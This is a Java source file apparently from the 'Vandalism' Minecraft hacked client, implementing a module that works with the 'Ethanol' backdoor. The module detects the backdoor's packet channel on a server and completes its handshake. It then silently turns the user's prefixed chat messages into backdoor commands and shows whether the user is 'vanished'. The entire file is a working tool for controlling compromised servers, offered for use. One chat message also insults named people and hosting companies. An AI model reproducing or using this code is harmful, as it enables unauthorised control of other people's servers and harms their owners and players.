/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.misc;

import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.StringValue;
import de.nekosarekawaii.vandalism.event.cancellable.network.IncomingPacketListener;
import de.nekosarekawaii.vandalism.event.cancellable.network.OutgoingPacketListener;
import de.nekosarekawaii.vandalism.event.normal.network.DisconnectListener;
import de.nekosarekawaii.vandalism.event.normal.render.Render2DListener;
import de.nekosarekawaii.vandalism.feature.module.AbstractModule;
import de.nekosarekawaii.vandalism.util.game.ChatUtil;
import de.nekosarekawaii.vandalism.util.game.PacketUtil;
import net.fabricmc.fabric.impl.networking.payload.RetainedPayload;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.network.ClientConnection;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.s2c.common.CustomPayloadS2CPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;

import java.nio.charset.StandardCharsets;
import java.util.Objects;

public class EthanolModule extends AbstractModule implements IncomingPacketListener, OutgoingPacketListener, DisconnectListener, Render2DListener {

    private static final Identifier ETHANOL_INIT = new Identifier("ethanol", "init");
    private static final Identifier ETHANOL_MESSAGE = new Identifier("ethanol", "message");
    private static final Identifier ETHANOL_COMMAND = new Identifier("ethanol", "command");
    private static final Identifier ETHANOL_VANISH = new Identifier("ethanol", "vanish");

    private final StringValue commandPrefix = new StringValue(this, "Command prefix", "Ethanol command prefix.", "-");
    private boolean detected;
    private boolean vanished;

    public EthanolModule() {
        super("Ethanol", "Ethanol backdoor implementation.", Category.MISC);
        this.detected = false;
        this.vanished = false;
    }

    @Override
    public void onActivate() {
        Vandalism.getInstance().getEventSystem().subscribe(this, IncomingPacketEvent.ID, OutgoingPacketEvent.ID, DisconnectEvent.ID, Render2DEvent.ID);
        this.detected = false;
        this.vanished = false;
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(this, IncomingPacketEvent.ID, OutgoingPacketEvent.ID, DisconnectEvent.ID, Render2DEvent.ID);
    }

    @Override
    public void onRender2DInGame(final DrawContext context, final float delta) {
        if (this.detected) {
            {
                final Text text = Text.literal("Ethanol detected");
                context.drawText(mc.textRenderer, text, context.getScaledWindowWidth() - mc.textRenderer.getWidth(text), context.getScaledWindowHeight() - mc.textRenderer.fontHeight, 0xFFFFFF, true);
            }
            if (this.vanished) {
                final Text text = Text.literal("Vanished").withColor(0xFF0000);
                context.drawText(mc.textRenderer, text, context.getScaledWindowWidth() - mc.textRenderer.getWidth(text), context.getScaledWindowHeight() - (mc.textRenderer.fontHeight * 2), 0xFFFFFF, true);
            }
        }
    }

    @Override
    public void onIncomingPacket(final IncomingPacketEvent event) {
        if (event.packet instanceof final CustomPayloadS2CPacket packet) {
            if (packet.payload() instanceof final RetainedPayload payload) {
                final Identifier id = payload.id();
                if (Objects.equals(id, EthanolModule.ETHANOL_INIT)) {
                    this.detected = true;
                    ChatUtil.chatMessage(Text.literal("Ethanol big mod detected with Enza XXD Mod by Rena-chan to get IP information with sidcool unterhosenpakete and french bread made by GrafWillAnus our big franzaske - sponsored by NHost (by Nzxter / Amkgre!!) and 24fire with big fire, marioteamhecker, Damian Juda / Sid Gruppe, ZapHostinng, TubeHosting in der Tube").withColor(0xFF0000));
                    event.connection.send(new CustomPayloadC2SPacket(new InitCustomPayload()));
                }

                if (Objects.equals(id, EthanolModule.ETHANOL_MESSAGE)) {
                    ChatUtil.chatMessage(new String(PacketUtil.readBuffer(payload.buf()), StandardCharsets.UTF_8));
                }

                if (Objects.equals(id, EthanolModule.ETHANOL_VANISH)) {
                    this.vanished = payload.buf().readByte() == 1;
                }
            }
        }
    }

    @Override
    public void onOutgoingPacket(final OutgoingPacketEvent event) {
        if (!this.detected)
            return;

        if (event.packet instanceof ChatMessageC2SPacket packet) {
            final String message = packet.chatMessage();
            final String prefix = this.commandPrefix.getValue();
            if (message.startsWith(prefix)) {
                mc.player.networkHandler.sendPacket(new CustomPayloadC2SPacket(new CommandCustomPayload(message.substring(prefix.length()))));
                event.setCancelled(true);
            }
        }
    }

    @Override
    public void onDisconnect(final ClientConnection clientConnection, final Text disconnectReason) {
        this.detected = false;
        this.vanished = false;
    }

    public static class CommandCustomPayload implements CustomPayload {

        private final String command;

        public CommandCustomPayload(final String command) {
            this.command = command;
        }

        @Override
        public void write(final PacketByteBuf buf) {
            buf.writeBytes(this.command.getBytes(StandardCharsets.UTF_8));
        }

        @Override
        public Identifier id() {
            return EthanolModule.ETHANOL_COMMAND;
        }
    }

    public static class InitCustomPayload implements CustomPayload {

        @Override
        public void write(final PacketByteBuf buf) {
        }

        @Override
        public Identifier id() {
            return EthanolModule.ETHANOL_INIT;
        }
    }
}
